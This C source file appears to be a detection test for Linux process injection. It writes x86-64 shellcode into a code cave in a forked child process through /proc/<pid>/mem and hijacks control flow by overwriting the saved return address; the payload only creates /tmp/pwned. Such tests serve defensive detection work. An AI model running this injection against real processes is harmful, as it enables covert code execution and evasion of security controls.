#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <ctype.h>
#include <elf.h>

unsigned char shellcode[] = {
    0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
    0xeb, 0x26,                    // jmp short get_path
    // --- back: ---
    0x5f,                          // pop rdi
    0xb8, 0x02, 0x00, 0x00, 0x00,  // mov rax, 2          (open)
    0xbe, 0x41, 0x00, 0x00, 0x00,  // mov esi, 0x41       (O_CREAT|O_WRONLY)
    0xba, 0xa4, 0x01, 0x00, 0x00,  // mov edx, 0x1a4      (0644)
    0x0f, 0x05,                    // syscall
    0x48, 0x89, 0xc7,              // mov rdi, rax        (fd)
    0xb8, 0x03, 0x00, 0x00, 0x00,  // mov rax, 3          (close)
    0x0f, 0x05,                    // syscall
    0xb8, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60         (exit)
    0x48, 0x31, 0xff,              // xor rdi, rdi
    0x0f, 0x05,                    // syscall
    // --- get_path: ---
    0xe8, 0xd5, 0xff, 0xff, 0xff,  // call back
    0x2f, 0x74, 0x6d, 0x70, 0x2f,  // "/tmp/"
    0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
    0x00                          
};
unsigned int shellcode_len = sizeof(shellcode);

#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#define MAX_LOOPS 100

pid_t create_victim_child_process() {
    pid_t pid = fork();
    if (pid < 0) {
        return 0;
    } else if (pid == 0) {
        sleep(2);
        exit(0);
    }
    usleep(200000);
    return pid;
}

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "/proc/%d/mem", pid);

    FILE *file = fopen(filepath, "r");
    if (!file) return -1;

    if (fseeko(file, (off_t)address, SEEK_SET) != 0) {
        fclose(file);
        return -2;
    }

    if (fread(buf, 1, len, file) != len) {
        fclose(file);
        return -3;
    }

    fclose(file);
    return 0;
}

void print_mem(unsigned char* buffer, long size) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%06zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", buffer[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

long get_reg(pid_t pid, const char* reg) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/syscall", pid);

    char buffer[256];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    //try to read registers until they become available
    ssize_t bytesRead;
    int i=0;
    while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        if (strncmp(buffer, "running", 7) != 0) break;

        i++;
        usleep(1000); 
    }

    close(fd);
    if (bytesRead <= 0) return -1;
    buffer[bytesRead] = '\0';

    long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
    int n = sscanf(buffer, "%ld %lx %lx %lx %lx %lx %lx %lx %lx",
                &syscall, &rdi, &rsi, &rdx, &r10, &r8, &r9, &rsp, &rip);

    if (n < 9) return -1;

    if (strcmp(reg, "syscall") == 0) return syscall;
    if (strcmp(reg, "rdi") == 0)     return rdi;
    if (strcmp(reg, "rsi") == 0)     return rsi;
    if (strcmp(reg, "rdx") == 0)     return rdx;
    if (strcmp(reg, "r10") == 0)     return r10;
    if (strcmp(reg, "r8") == 0)      return r8;
    if (strcmp(reg, "r9") == 0)      return r9;
    if (strcmp(reg, "rsp") == 0)     return rsp;
    if (strcmp(reg, "rip") == 0)     return rip;

    return -1;
}

long find_code_cave(pid_t pid, size_t shellcode_len) {
    char maps_path[256];
    char mem_path[256];
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);

    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    char line[512];
    long start_addr, end_addr;
    char perms[5];
    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(maps_file);
        close(mem_fd);
        return -1;
    }

    while (fgets(line, sizeof(line), maps_file)) {
         
        if (sscanf(line, "%lx-%lx %4s", &start_addr, &end_addr, perms) != 3)
            continue;
        
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;

        // read the region dividing it in chunks
        if (lseek(mem_fd, start_addr, SEEK_SET) == (off_t)-1)
            continue;
        long current_addr = start_addr;
        size_t consecutive_zeros = 0;
        while (current_addr < end_addr) {

            size_t bytes_to_read = end_addr - current_addr;
            bytes_to_read = MIN(bytes_to_read, CHUNK_SIZE);
            ssize_t bytes_read = read(mem_fd, buffer, bytes_to_read);
            if (bytes_read <= 0) break;
            
            // look for consecutives 0x00
            for (ssize_t i = 0; i < bytes_read; i++) {
                if (buffer[i] == 0x00) {
                    consecutive_zeros++;
                    
                    if (consecutive_zeros >= shellcode_len) {
                        long cave_addr = current_addr + i - shellcode_len + 1;

                        fclose(maps_file);
                        close(mem_fd);
                        free(buffer);
                        return cave_addr; 
                    }
                } else {
                    consecutive_zeros = 0;
                }
            }
            current_addr += bytes_read;
        }
    }
    
    fclose(maps_file);
    close(mem_fd);
    free(buffer);
    return -1;
}

long find_return_address(long pid, long rsp) {
    //read 128 element from the stack -> stack_dump
    uint64_t stack_dump[128]; 
    char mem_path[128];
    snprintf(mem_path, sizeof(mem_path), "/proc/%ld/mem", pid);

    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) return -1;

    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
    close(fd);
    if (bytes_read <= 0) return -1;
    int num_elements = bytes_read / sizeof(uint64_t);

    // read the memory of the process
    char maps_file_name[128];
    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);
    char *line = NULL;
    size_t len = 0;
    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) return -1;

    int best_index = 9999; // Track the index closest to RSP
    long found_ret_addr_location = -1;

    //for every region in the memory ...
    while (getline(&line, &len, maps_file) != -1) {
        long start_addr, end_addr;
        char perms[5];

        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
        if (sscanf(line, "%lx-%lx %4s", &start_addr, &end_addr, perms) != 3)
            continue;
            
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;
            
        for (int i = 0; i < num_elements && i < best_index; i++) {
            //...for every value in the stack...
            uint64_t candidate_val = stack_dump[i];

            //...does this value point to this region
            if (candidate_val >= (uint64_t)start_addr && candidate_val < (uint64_t)end_addr) {
                best_index = i; // new closest found
                // compute static address
                found_ret_addr_location = rsp + (i * sizeof(uint64_t));
            }
        }
    }
    free(line);
    fclose(maps_file);
    return found_ret_addr_location;
}


int main(int argc, char *argv[]) { 
    pid_t pid = create_victim_child_process();
    if (pid == 0) {
        fprintf(stderr, "[-] Failed to fork\n");
        exit(1);
    }
    printf("[+] target PID: %d\n", pid);

    long target_address = find_code_cave(pid, shellcode_len);
    if (target_address == -1) {
        fprintf(stderr, "[-] Code cave not found\n");
        exit(1);
    }
    printf("[+] Code cave found at: 0x%lx\n", target_address);

    unsigned char CodeCave[shellcode_len];
    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0) 
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] Code Cave content before the overwrite: \n");
    print_mem(CodeCave, shellcode_len);

    if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "[-] Failed to write payload into code cave\n");
        exit(1);
    }
    printf("[+] Payload written successfully\n");

    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0) 
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] Code Cave content after the overwrite: \n");
    print_mem(CodeCave, shellcode_len);

    // gathering rsp, necessary to find the return address
    long rsp = get_reg(pid, "rsp");
    if(rsp == -1) {
        fprintf(stderr, "[-] Stack pointer not found\n");
        exit(1);
    }
    printf("[+] Stack pointer: 0x%lx\n",rsp);

    // gathering return address
    long return_address = find_return_address(pid, rsp);
    if(return_address == -1) {
        fprintf(stderr, "[-] Return address not found\n");
        exit(1);
    }
    printf("[+] Return address: 0x%lx\n",return_address);

    // overwrite the return address with the address of the code cave
    if(write_in_mem(return_address, pid, (unsigned char *)&target_address, sizeof(long)) != (ssize_t)sizeof(long)) {
        fprintf(stderr, "[-] Failed to overwrite the return address\n");
        exit(1);
    }
    printf("[+] Return address overwritten successfully\n");

    unsigned char buffer[sizeof(long)];
    if (read_mem(buffer, pid, return_address, sizeof(long)) != 0)
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] Return address slot after the overwrite:\n");
    print_mem(buffer, sizeof(long));

    printf("[+] Injection finished\n");
    exit(0);
}

/**
 * This technique performs control-flow hijacking via Return Address Overwriting.
 * It first identifies a code cave by scanning /proc/<pid>/maps
 * and writes the shellcode into it through /proc/<pid>/mem.
 * It then inspects the process stack (from the RSP register) to locate the saved return address.
 * By overwriting this stack location with the address of the code cave,
 * the execution is redirected to the payload the moment the CPU executes the next RET instruction.
 * 
 * Note: this test forks a child process to use as the injection target.
 * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
 * where a process can only modify the memory of its own descendants.
 * This may differ from a real-world scenario where the attacker targets an arbitrary process,
 * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
 * access patterns are generated regardless of the relationship between injector and target.
 * 
 * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
 * https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
 * 
 */